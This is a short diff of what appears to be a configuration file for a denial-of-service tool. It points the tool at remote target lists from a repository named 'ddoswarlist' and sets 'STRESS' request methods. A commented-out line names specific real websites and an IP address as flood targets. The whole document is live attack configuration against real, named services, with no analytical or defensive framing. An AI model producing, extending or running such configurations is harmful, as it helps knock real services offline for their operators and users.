@@ -4,7 +4,7 @@
 
 -c https://raw.githubusercontent.com/alexnest-ua/targets/main/api_auto_mila --http-methods GET
 
--c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/post.lst --http-methods POST
+-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/get.lst --http-methods GET STRESS
 
 #https://payanyway.ru https://www.avtovokzaly.ru https://bus.tutu.ru https://185.111.86.13:443 --http-methods GET STRESS
 
